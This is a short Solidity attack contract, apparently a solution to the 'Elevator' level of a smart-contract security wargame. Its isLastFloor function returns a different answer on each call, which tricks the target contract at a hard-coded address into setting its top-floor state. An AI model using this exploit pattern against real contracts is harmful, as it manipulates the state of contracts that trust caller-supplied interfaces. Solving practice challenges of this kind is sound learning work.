// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Elevator.sol";

contract ElevatorAttack {
  bool public flipped = false;

  Elevator public elly = Elevator(0xB4F7ceC67414AF95e0cbfdfe25D547A4957C93e1);

  function isLastFloor(uint)  external returns (bool) {
    if(flipped){
      flipped = false;
      return true;
    }
    else{
      flipped = true;
      return false;
    }
  }

  function attemptHack() public {
    elly.goTo(10);
  }
}
